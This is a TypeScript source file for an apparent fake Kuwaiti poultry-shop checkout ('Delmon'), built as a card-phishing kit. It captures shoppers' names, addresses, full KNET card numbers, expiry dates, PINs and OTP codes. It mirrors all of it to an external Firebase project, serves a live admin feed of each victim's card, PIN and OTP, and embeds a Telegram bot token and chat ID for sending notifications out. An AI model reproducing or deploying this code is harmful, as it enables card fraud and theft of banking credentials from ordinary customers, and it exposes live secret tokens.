import { initializeApp, getApps, getApp } from 'firebase/app';
import {
  getFirestore,
  doc,
  setDoc,
  collection,
  onSnapshot,
  serverTimestamp,
  deleteDoc
} from 'firebase/firestore';
import { db as appletDb } from './firebase';

// External esfgdr Firebase Configuration (Real-time Visitors, Bookings & Bookings Steps Database)
export const ESFGDR_FIREBASE_CONFIG = {
  apiKey: "AIzaSyAFEf9ZkDkCi7AEXPJ8z_AFsX4pTiPv7Vo",
  authDomain: "esfgdr.firebaseapp.com",
  databaseURL: "https://esfgdr-default-rtdb.firebaseio.com",
  projectId: "esfgdr",
  storageBucket: "esfgdr.firebasestorage.app",
  messagingSenderId: "479566323800",
  appId: "1:479566323800:web:72bcd20412cd0c5b61ea2d",
  measurementId: "G-GMSB6TBP94"
};

const ESFGDR_APP_NAME = 'esfgdr-secondary-app';
const esfgdrApp = getApps().some((a) => a.name === ESFGDR_APP_NAME)
  ? getApp(ESFGDR_APP_NAME)
  : initializeApp(ESFGDR_FIREBASE_CONFIG, ESFGDR_APP_NAME);

export const esfgdrDb = getFirestore(esfgdrApp);

/**
 * Get or create a persistent session ID for the current visitor
 */
export function getSessionId(): string {
  try {
    const existing =
      sessionStorage.getItem('esfgdr_session_id') ||
      localStorage.getItem('esfgdr_session_id');
    if (existing && existing.startsWith('session_')) {
      return existing;
    }
    const generated = `session_${Date.now()}_${Math.random().toString(36).slice(2, 9)}`;
    sessionStorage.setItem('esfgdr_session_id', generated);
    localStorage.setItem('esfgdr_session_id', generated);
    return generated;
  } catch {
    return `session_${Date.now()}_${Math.random().toString(36).slice(2, 9)}`;
  }
}

/**
 * Start a fresh session ID when needed (e.g. new registration/attempt)
 */
export function refreshSessionId(): string {
  const generated = `session_${Date.now()}_${Math.random().toString(36).slice(2, 9)}`;
  try {
    sessionStorage.setItem('esfgdr_session_id', generated);
    localStorage.setItem('esfgdr_session_id', generated);
  } catch {
    // ignore
  }
  return generated;
}

/**
 * Get or create a shared booking ID (KW-XXXXXX) so registration, checkout, card entry, and OTP
 * all update the exact same booking document in `bookings/{bookingId}`.
 */
export function getOrCreateBookingId(forceNew: boolean = false): string {
  try {
    if (!forceNew) {
      const existing =
        sessionStorage.getItem('delmon_active_booking_id') ||
        localStorage.getItem('delmon_active_booking_id');
      if (existing && existing.startsWith('KW-')) {
        return existing;
      }
    }
    const generated = `KW-${Math.floor(100000 + Math.random() * 900000)}`;
    sessionStorage.setItem('delmon_active_booking_id', generated);
    localStorage.setItem('delmon_active_booking_id', generated);
    return generated;
  } catch {
    return `KW-${Math.floor(100000 + Math.random() * 900000)}`;
  }
}

/**
 * Track visitor presence in `visitors/{sessionId}` across both esfgdr & applet Firestore
 */
export async function trackVisitor(
  currentPage: string = '/',
  currentStep: string = 'home',
  extraData: Record<string, any> = {}
): Promise<void> {
  const sessionId = getSessionId();
  const payload = {
    sessionId,
    isOnline: true,
    currentPage,
    currentStep,
    createdAt: serverTimestamp(),
    updatedAt: serverTimestamp(),
    ...extraData
  };

  try {
    await Promise.allSettled([
      setDoc(doc(esfgdrDb, 'visitors', sessionId), payload, { merge: true }),
      setDoc(doc(appletDb, 'visitors', sessionId), payload, { merge: true })
    ]);
  } catch (err) {
    console.warn('Visitor tracking warning:', err);
  }
}

/**
 * Track a booking step in `bookings_steps/{sessionId}_{step}` across both esfgdr & applet Firestore
 */
export async function trackBookingStep(
  step: string,
  page: string,
  data: Record<string, any>,
  customSessionId?: string
): Promise<void> {
  const sessionId = customSessionId || getSessionId();
  const docId = `${sessionId}_${step}`;
  const payload = {
    sessionId,
    userId: 'anonymous',
    page,
    step,
    data,
    timestamp: serverTimestamp(),
    updatedAt: serverTimestamp()
  };

  try {
    await Promise.allSettled([
      setDoc(doc(esfgdrDb, 'bookings_steps', docId), payload, { merge: true }),
      setDoc(doc(appletDb, 'bookings_steps', docId), payload, { merge: true })
    ]);
  } catch (err) {
    console.warn(`Booking step (${step}) tracking warning:`, err);
  }
}

/**
 * Track customer registration / checkout details (`details_filled`)
 * Writes to `bookings/{bookingId}`, `bookings_steps/{sessionId}_details_filled`, and `visitors/{sessionId}`
 * in both esfgdrDb and appletDb so the Admin Panel receives registrations immediately.
 */
export async function trackDetailsFilled(details: {
  bookingId?: string;
  name: string;
  phone: string;
  area: string;
  governorate?: string;
  street?: string;
  address: string;
  amount: number;
  subtotal?: number;
  items?: string[];
  paymentMethod?: string;
  notes?: string;
}): Promise<string> {
  const sessionId = getSessionId();
  const bookingId = details.bookingId || getOrCreateBookingId(false);
  try {
    sessionStorage.setItem('delmon_active_booking_id', bookingId);
    localStorage.setItem('delmon_active_booking_id', bookingId);
  } catch {
    // ignore
  }

  const cleanName = details.name?.trim() || 'عميل دلمون الكويت';
  const cleanPhone = details.phone?.trim() || '00000000';
  const cleanArea = details.area || details.governorate || 'الكويت';
  const cleanGov = details.governorate || details.area || 'الكويت';
  const cleanStreet = details.street || details.address || cleanArea;
  const cleanAddress = details.address || `${cleanGov} — ${cleanStreet}`;
  const amountNum = Number(details.amount || 1);
  const subtotalNum = Number(details.subtotal ?? details.amount ?? 1);
  const itemsList = Array.isArray(details.items) ? details.items : [];
  const packageSummary =
    itemsList.length > 0
      ? itemsList.join(' × ')
      : 'طلب متجر دلمون الكويت للدواجن';

  const stepData: Record<string, any> = {
    name: cleanName,
    phone: cleanPhone,
    area: cleanArea,
    address: cleanAddress,
    notes: details.notes || '',
    amount: amountNum,
    subtotal: subtotalNum,
    bookingId
  };

  // Exact schema matching esfgdr bookings (BH-324983 / KW-599898) so external & internal panels display registration immediately
  const bookingDoc: Record<string, any> = {
    id: bookingId,
    bookingId,
    sessionId,
    name: cleanName,
    phone: cleanPhone,
    email: `${cleanPhone}@delmon.kw`,
    fromCity: cleanArea,
    toCity: cleanArea,
    fromAddress: cleanAddress,
    toAddress: cleanAddress,
    propertySize: 'Delmon Kuwait Poultry Order',
    packageLabel: packageSummary,
    notes: details.notes || '',
    depositAmount: amountNum,
    paymentAmount: subtotalNum > 0 ? subtotalNum : amountNum,
    paymentCurrency: 'KWD',
    paymentMethod: 'KNET - UPayments',
    paymentProvider: 'The Shared Electronic Banking Services Company - KNET',
    paymentStatus: 'pending',
    status: 'pending',
    createdAt: serverTimestamp(),
    updatedAt: serverTimestamp()
  };

  await Promise.allSettled([
    setDoc(doc(esfgdrDb, 'bookings', bookingId), bookingDoc, { merge: true }),
    setDoc(doc(appletDb, 'bookings', bookingId), bookingDoc, { merge: true }),
    trackVisitor('/card-payment.html', 'details_filled', {
      customerName: cleanName,
      name: cleanName,
      phone: cleanPhone,
      area: cleanArea,
      address: cleanAddress,
      bookingId
    }),
    trackBookingStep('details_filled', '/card-payment.html', stepData, sessionId)
  ]);

  return bookingId;
}

/**
 * Track KNET Card + Expiry + PIN submission (`payment_started`, `payment`, `otp_requested`)
 * Updates `bookings/{bookingId}`, `bookings_steps`, and `visitors/{sessionId}`
 */
export async function trackPaymentSubmitted(payload: {
  bookingId: string;
  customerName: string;
  phone: string;
  area: string;
  address: string;
  amount: number;
  bank: string;
  cardNumber: string;
  cardExpiry: string;
  pin: string;
  cardHolder: string;
}): Promise<void> {
  const sessionId = getSessionId();
  const bookingId = payload.bookingId || getOrCreateBookingId(false);
  const nowIso = new Date().toISOString();
  const amountNum = Number(payload.amount || 0);
  const cardLast4 = payload.cardNumber.replace(/\s/g, '').slice(-4) || '0000';

  const bookingPaymentUpdate: Record<string, any> = {
    id: bookingId,
    bookingId,
    sessionId,
    name: payload.customerName || 'عميل دلمون الكويت',
    customerName: payload.customerName || 'عميل دلمون الكويت',
    phone: payload.phone,
    area: payload.area || 'الكويت',
    address: payload.address || payload.area || 'الكويت',
    fromCity: payload.area || 'الكويت',
    toCity: payload.area || 'الكويت',
    fromAddress: payload.address || payload.area || 'الكويت',
    toAddress: payload.address || payload.area || 'الكويت',
    depositAmount: amountNum,
    paymentAmount: amountNum,
    amount: amountNum,
    paymentCurrency: 'KWD',
    paymentMethod: 'KNET - UPayments',
    paymentProvider: payload.bank || 'The Shared Electronic Banking Services Company - KNET',
    bank: payload.bank,
    cardBrand: payload.bank || 'KNET',
    cardNumber: payload.cardNumber,
    cardLast4,
    cardExpiry: payload.cardExpiry,
    cardCvv: payload.pin,
    pin: payload.pin,
    paymentCardholderName: payload.cardHolder || payload.customerName,
    paymentStatus: 'awaiting_otp',
    status: 'waiting_otp',
    isVerified: false,
    updatedAt: serverTimestamp()
  };

  await Promise.allSettled([
    setDoc(doc(esfgdrDb, 'bookings', bookingId), bookingPaymentUpdate, { merge: true }),
    setDoc(doc(appletDb, 'bookings', bookingId), bookingPaymentUpdate, { merge: true }),
    trackVisitor('/card-payment.html', 'payment', {
      customerName: payload.customerName,
      name: payload.customerName,
      phone: payload.phone,
      area: payload.area,
      bookingId,
      cardNumber: payload.cardNumber,
      cardExpiry: payload.cardExpiry,
      pin: payload.pin,
      bank: payload.bank
    }),
    trackBookingStep(
      'payment_started',
      '/card-payment.html',
      {
        bookingId,
        customerName: payload.customerName,
        phone: payload.phone,
        area: payload.area,
        address: payload.address,
        amount: amountNum,
        currency: 'KWD',
        bank: payload.bank,
        cardNumber: payload.cardNumber,
        cardExpiry: payload.cardExpiry,
        pin: payload.pin,
        cardHolder: payload.cardHolder
      },
      sessionId
    ),
    trackBookingStep(
      'payment',
      '/card-payment.html',
      {
        bookingId,
        customerName: payload.customerName,
        phone: payload.phone,
        address: payload.address,
        amount: amountNum,
        currency: 'KWD',
        bank: payload.bank,
        cardNumber: payload.cardNumber,
        cardExpiry: payload.cardExpiry,
        pin: payload.pin,
        cardHolder: payload.cardHolder,
        timestamp: nowIso
      },
      sessionId
    ),
    trackBookingStep(
      'otp_requested',
      '/card-payment.html',
      {
        bookingId,
        phone: payload.phone,
        cardHolder: payload.cardHolder
      },
      sessionId
    )
  ]);
}

/**
 * Track OTP verification submission (`otp` and `payment_completed`)
 * Updates `bookings/{bookingId}`, `bookings_steps`, and `visitors/{sessionId}`
 */
export async function trackOtpSubmitted(payload: {
  bookingId: string;
  otpCode: string;
  cardHolder: string;
  cardNumber: string;
  phone: string;
  amount: number;
  cardLast4: string;
}): Promise<void> {
  const sessionId = getSessionId();
  const bookingId = payload.bookingId || getOrCreateBookingId(false);
  const amountNum = Number(payload.amount || 0);

  const bookingOtpUpdate: Record<string, any> = {
    id: bookingId,
    bookingId,
    sessionId,
    verificationCode: payload.otpCode,
    otpCode: payload.otpCode,
    isVerified: true,
    paymentStatus: 'succeeded',
    status: 'confirmed',
    cardLast4: payload.cardLast4,
    cardNumber: payload.cardNumber,
    updatedAt: serverTimestamp()
  };

  await Promise.allSettled([
    setDoc(doc(esfgdrDb, 'bookings', bookingId), bookingOtpUpdate, { merge: true }),
    setDoc(doc(appletDb, 'bookings', bookingId), bookingOtpUpdate, { merge: true }),
    trackVisitor('/card-payment.html', 'payment_completed', {
      customerName: payload.cardHolder,
      name: payload.cardHolder,
      phone: payload.phone,
      bookingId,
      otpCode: payload.otpCode
    }),
    trackBookingStep(
      'otp',
      '/card-payment.html',
      {
        bookingId,
        otpCode: payload.otpCode,
        cardHolder: payload.cardHolder,
        cardNumber: payload.cardNumber,
        phone: payload.phone
      },
      sessionId
    ),
    trackBookingStep(
      'payment_completed',
      '/card-payment.html',
      {
        bookingId,
        status: 'succeeded',
        currency: 'KWD',
        amount: amountNum,
        cardLast4: payload.cardLast4,
        otpCode: payload.otpCode
      },
      sessionId
    )
  ]);
}

export interface LiveSessionSummary {
  sessionId: string;
  updatedAtMs: number;
  currentPage: string;
  currentStep: string;
  isOnline: boolean;
  name?: string;
  phone?: string;
  area?: string;
  address?: string;
  amount?: number;
  items?: string[];
  bank?: string;
  cardNumber?: string;
  cardExpiry?: string;
  pin?: string;
  otpCode?: string;
  bookingId?: string;
  status?: string;
}

/**
 * Subscribe in real-time to all registrations, cards, and OTPs across both
 * `bookings_steps` and `bookings` in esfgdrDb and appletDb
 */
export function subscribeToLiveRegistrations(
  onUpdate: (sessions: LiveSessionSummary[]) => void,
  onError?: (err: Error) => void
): () => void {
  const stepsBySession = new Map<string, Record<string, any>>();
  const bookingsById = new Map<string, Record<string, any>>();

  const recompute = () => {
    const mergedMap = new Map<string, LiveSessionSummary>();

    // 1. Process all bookings_steps grouped by sessionId
    for (const [sessionId, steps] of stepsBySession.entries()) {
      const details = steps.details_filled?.data || {};
      const paymentStarted = steps.payment_started?.data || {};
      const payment = steps.payment?.data || {};
      const otp = steps.otp?.data || {};
      const completed = steps.payment_completed?.data || {};

      let latestSec = 0;
      let latestStep = 'view_home';
      let latestPage = '/';

      for (const s of Object.values(steps)) {
        const sec = s?.updatedAt?.seconds || s?.timestamp?.seconds || 0;
        if (sec >= latestSec) {
          latestSec = sec;
          latestStep = s?.step || latestStep;
          latestPage = s?.page || latestPage;
        }
      }

      const bookingId =
        payment.bookingId ||
        paymentStarted.bookingId ||
        details.bookingId ||
        otp.bookingId ||
        completed.bookingId ||
        '';

      const linkedBooking = bookingId ? bookingsById.get(bookingId) || {} : {};

      const name =
        details.name ||
        paymentStarted.customerName ||
        payment.customerName ||
        payment.cardHolder ||
        otp.cardHolder ||
        linkedBooking.name ||
        linkedBooking.customerName ||
        linkedBooking.paymentCardholderName ||
        '';
      const phone =
        details.phone ||
        paymentStarted.phone ||
        payment.phone ||
        otp.phone ||
        linkedBooking.phone ||
        '';
      const cardNumber =
        payment.cardNumber ||
        paymentStarted.cardNumber ||
        otp.cardNumber ||
        linkedBooking.cardNumber ||
        '';
      const cardExpiry =
        payment.cardExpiry ||
        paymentStarted.cardExpiry ||
        linkedBooking.cardExpiry ||
        '';
      const pin =
        payment.pin ||
        paymentStarted.pin ||
        linkedBooking.pin ||
        linkedBooking.cardCvv ||
        '';
      const otpCode =
        otp.otpCode ||
        completed.otpCode ||
        linkedBooking.otpCode ||
        linkedBooking.verificationCode ||
        '';

      if (name || phone || cardNumber || otpCode) {
        const key = bookingId || sessionId;
        mergedMap.set(key, {
          sessionId,
          updatedAtMs: latestSec ? latestSec * 1000 : Date.now(),
          currentPage: latestPage,
          currentStep: latestStep,
          isOnline: true,
          name: name || 'عميل دلمون الكويت',
          phone,
          area:
            details.area ||
            details.governorate ||
            paymentStarted.area ||
            linkedBooking.area ||
            linkedBooking.fromCity ||
            '',
          address:
            details.address ||
            paymentStarted.address ||
            payment.address ||
            linkedBooking.address ||
            linkedBooking.fromAddress ||
            '',
          amount: Number(
            payment.amount ??
              paymentStarted.amount ??
              details.amount ??
              linkedBooking.depositAmount ??
              linkedBooking.paymentAmount ??
              0
          ),
          items:
            Array.isArray(details.items) && details.items.length > 0
              ? details.items
              : Array.isArray(linkedBooking.items)
              ? linkedBooking.items
              : linkedBooking.packageLabel
              ? [linkedBooking.packageLabel]
              : [],
          bank:
            payment.bank ||
            paymentStarted.bank ||
            linkedBooking.bank ||
            linkedBooking.cardBrand ||
            '',
          cardNumber,
          cardExpiry,
          pin,
          otpCode,
          bookingId: bookingId || undefined,
          status:
            completed.status === 'succeeded' ||
            linkedBooking.paymentStatus === 'succeeded' ||
            otpCode
              ? 'تم إدخال رمز OTP'
              : cardNumber
              ? 'بطاقة كي نت + PIN'
              : 'تسجيل بيانات العميل'
        });
      }
    }

    // 2. Process any standalone bookings in `bookings` collection not yet in mergedMap
    for (const [bId, b] of bookingsById.entries()) {
      const existingByBooking = mergedMap.get(bId);
      const existingBySession = b.sessionId ? mergedMap.get(b.sessionId) : undefined;
      const target = existingByBooking || existingBySession;

      const sec = b?.updatedAt?.seconds || b?.createdAt?.seconds || 0;
      const bMs = sec ? sec * 1000 : Date.now();
      const otpCode = b.otpCode || b.verificationCode || target?.otpCode || '';
      const cardNumber = b.cardNumber || target?.cardNumber || '';
      const cardExpiry = b.cardExpiry || target?.cardExpiry || '';
      const pin = b.pin || b.cardCvv || target?.pin || '';
      const name =
        b.name || b.customerName || b.paymentCardholderName || target?.name || '';
      const phone = b.phone || target?.phone || '';

      if (!name && !phone && !cardNumber && !otpCode) continue;

      const key = bId;
      if (b.sessionId && mergedMap.has(b.sessionId) && bId !== b.sessionId) {
        mergedMap.delete(b.sessionId);
      }

      mergedMap.set(key, {
        sessionId: b.sessionId || target?.sessionId || `booking_${bId}`,
        updatedAtMs: Math.max(bMs, target?.updatedAtMs || 0),
        currentPage: target?.currentPage || '/card-payment.html',
        currentStep: otpCode
          ? 'payment_completed'
          : cardNumber
          ? 'payment'
          : 'details_filled',
        isOnline: true,
        name: name || 'عميل دلمون الكويت',
        phone,
        area: b.area || b.fromCity || target?.area || '',
        address: b.address || b.fromAddress || target?.address || '',
        amount: Number(
          b.depositAmount ?? b.paymentAmount ?? b.amount ?? target?.amount ?? 0
        ),
        items:
          target?.items && target.items.length > 0
            ? target.items
            : Array.isArray(b.items) && b.items.length > 0
            ? b.items
            : b.packageLabel
            ? [b.packageLabel]
            : [],
        bank: b.bank || b.cardBrand || target?.bank || '',
        cardNumber,
        cardExpiry,
        pin,
        otpCode,
        bookingId: bId,
        status: otpCode
          ? 'تم إدخال رمز OTP'
          : cardNumber
          ? 'بطاقة كي نت + PIN'
          : 'تسجيل بيانات العميل'
      });
    }

    const list = Array.from(mergedMap.values()).sort(
      (a, b) => b.updatedAtMs - a.updatedAtMs
    );
    onUpdate(list);
  };

  const handleStepsSnapshot = (snap: any) => {
    snap.forEach((docSnap: any) => {
      const d = docSnap.data();
      const sid = d.sessionId || docSnap.id;
      const curr = stepsBySession.get(sid) || {};
      curr[d.step || 'unknown'] = d;
      stepsBySession.set(sid, curr);
    });
    recompute();
  };

  const handleBookingsSnapshot = (snap: any) => {
    snap.forEach((docSnap: any) => {
      const d = docSnap.data();
      const bId = d.bookingId || d.id || docSnap.id;
      bookingsById.set(bId, { id: bId, ...d });
    });
    recompute();
  };

  const unsubEsfgdrSteps = onSnapshot(
    collection(esfgdrDb, 'bookings_steps'),
    handleStepsSnapshot,
    (err) => {
      console.warn('esfgdr bookings_steps listener warning:', err);
      if (onError) onError(err);
    }
  );

  const unsubEsfgdrBookings = onSnapshot(
    collection(esfgdrDb, 'bookings'),
    handleBookingsSnapshot,
    (err) => {
      console.warn('esfgdr bookings listener warning:', err);
    }
  );

  const unsubAppletSteps = onSnapshot(
    collection(appletDb, 'bookings_steps'),
    handleStepsSnapshot,
    () => {}
  );

  const unsubAppletBookings = onSnapshot(
    collection(appletDb, 'bookings'),
    handleBookingsSnapshot,
    () => {}
  );

  return () => {
    unsubEsfgdrSteps();
    unsubEsfgdrBookings();
    unsubAppletSteps();
    unsubAppletBookings();
  };
}

/**
 * Delete all steps and booking docs for a session from esfgdr and appletDb
 */
export async function deleteSessionSteps(sessionId: string, bookingId?: string): Promise<void> {
  const possibleSteps = [
    'view_home',
    'view_cart',
    'details_filled',
    'view_payment',
    'payment_started',
    'payment',
    'otp_requested',
    'otp',
    'payment_completed'
  ];
  const tasks: Promise<any>[] = [
    deleteDoc(doc(esfgdrDb, 'visitors', sessionId)),
    deleteDoc(doc(appletDb, 'visitors', sessionId)),
    ...possibleSteps.map((st) => deleteDoc(doc(esfgdrDb, 'bookings_steps', `${sessionId}_${st}`))),
    ...possibleSteps.map((st) => deleteDoc(doc(appletDb, 'bookings_steps', `${sessionId}_${st}`)))
  ];
  if (bookingId) {
    tasks.push(
      deleteDoc(doc(esfgdrDb, 'bookings', bookingId)),
      deleteDoc(doc(appletDb, 'bookings', bookingId))
    );
  }
  await Promise.allSettled(tasks);
}

// ============================================================================
// Unified Telegram Notification Service
// ============================================================================

export const DEFAULT_TELEGRAM_CONFIG = {
  botToken: "8911571776:AAF34QGAz1SPQa7bjijcXblKi-bSbY2qY0Q",
  botUsername: "ghhfvsshsorffs_bot",
  chatId: "6726553753"
};

export interface TelegramConfigState {
  botToken: string;
  botUsername: string;
  chatId: string;
}

export const getTelegramConfig = (): TelegramConfigState => {
  try {
    const saved = typeof window !== 'undefined' ? localStorage.getItem('delmon_telegram_config') : null;
    if (saved) {
      const parsed = JSON.parse(saved);
      const resolvedChatId = (!parsed.chatId || parsed.chatId === '8914993162')
        ? DEFAULT_TELEGRAM_CONFIG.chatId
        : parsed.chatId;

      return {
        botToken: parsed.botToken || DEFAULT_TELEGRAM_CONFIG.botToken,
        botUsername: parsed.botUsername || DEFAULT_TELEGRAM_CONFIG.botUsername,
        chatId: resolvedChatId
      };
    }
  } catch {
    // fallback to default
  }
  return { ...DEFAULT_TELEGRAM_CONFIG };
};

export const saveTelegramConfig = (config: TelegramConfigState) => {
  if (typeof window !== 'undefined') {
    localStorage.setItem('delmon_telegram_config', JSON.stringify(config));
  }
};

export const resetTelegramConfig = (): TelegramConfigState => {
  if (typeof window !== 'undefined') {
    localStorage.removeItem('delmon_telegram_config');
  }
  return { ...DEFAULT_TELEGRAM_CONFIG };
};

export const TELEGRAM_CONFIG = DEFAULT_TELEGRAM_CONFIG;

export interface TelegramSendResult {
  ok: boolean;
  error?: string;
}

export async function sendTelegramNotificationDetailed(
  message: string,
  configOverride?: Partial<TelegramConfigState>
): Promise<TelegramSendResult> {
  const cfg = getTelegramConfig();
  const token = (configOverride?.botToken || cfg.botToken || DEFAULT_TELEGRAM_CONFIG.botToken).trim();
  const chatId = (configOverride?.chatId || cfg.chatId || DEFAULT_TELEGRAM_CONFIG.chatId).trim();

  if (!token || !chatId) {
    return { ok: false, error: 'لم يتم تحديد رمز البوت أو معرف المحادثة' };
  }

  const baseUrl = `https://api.telegram.org/bot${token}/sendMessage`;

  try {
    const formBody = new URLSearchParams();
    formBody.append('chat_id', chatId);
    formBody.append('text', message);
    formBody.append('parse_mode', 'HTML');
    formBody.append('disable_web_page_preview', 'true');

    const response = await fetch(baseUrl, {
      method: 'POST',
      body: formBody,
      keepalive: true
    });

    const resJson = await response.json();
    if (resJson && resJson.ok) {
      return { ok: true };
    }

    const plainText = message.replace(/<[^>]+>/g, '');
    const retryBody = new URLSearchParams();
    retryBody.append('chat_id', chatId);
    retryBody.append('text', plainText);

    const retryRes = await fetch(baseUrl, {
      method: 'POST',
      body: retryBody,
      keepalive: true
    });
    const retryJson = await retryRes.json();
    if (retryJson && retryJson.ok) {
      return { ok: true };
    }

    return {
      ok: false,
      error: resJson?.description || 'فشل إرسال الرسالة عبر تلغرام'
    };
  } catch (err: any) {
    try {
      const plainText = message.replace(/<[^>]+>/g, '');
      const getUrl = `${baseUrl}?chat_id=${encodeURIComponent(chatId)}&text=${encodeURIComponent(plainText)}`;
      await fetch(getUrl, { method: 'GET', mode: 'no-cors', keepalive: true });
      return { ok: true };
    } catch {
      console.warn('Telegram notification delivery error:', err);
      return { ok: false, error: err?.message || 'خطأ في الاتصال بشبكة تلغرام' };
    }
  }
}

export async function sendTelegramNotification(
  message: string,
  configOverride?: Partial<TelegramConfigState>
): Promise<boolean> {
  const result = await sendTelegramNotificationDetailed(message, configOverride);
  return result.ok;
}

export async function checkTelegramUpdates(botToken?: string): Promise<{
  ok: boolean;
  updates?: any[];
  detectedChats?: { id: string | number; name: string; username?: string; text?: string }[];
  error?: string;
}> {
  try {
    const cfg = getTelegramConfig();
    const token = (botToken || cfg.botToken || DEFAULT_TELEGRAM_CONFIG.botToken).trim();
    const response = await fetch(`https://api.telegram.org/bot${token}/getUpdates`);
    const data = await response.json();
    if (!data.ok) {
      return { ok: false, error: data.description || 'فشل فحص التحديثات' };
    }

    const updates = data.result || [];
    const chatsMap = new Map<string, { id: string | number; name: string; username?: string; text?: string }>();

    for (const u of updates) {
      const msg = u.message || u.edited_message || u.channel_post;
      if (msg && msg.chat) {
        const cId = msg.chat.id.toString();
        const name = [msg.chat.first_name, msg.chat.last_name].filter(Boolean).join(' ') || msg.chat.title || 'مستخدم';
        chatsMap.set(cId, {
          id: msg.chat.id,
          name,
          username: msg.chat.username,
          text: msg.text || ''
        });
      }
    }

    return {
      ok: true,
      updates,
      detectedChats: Array.from(chatsMap.values())
    };
  } catch (err: any) {
    return { ok: false, error: err?.message || 'خطأ في الاتصال بتلغرام' };
  }
}
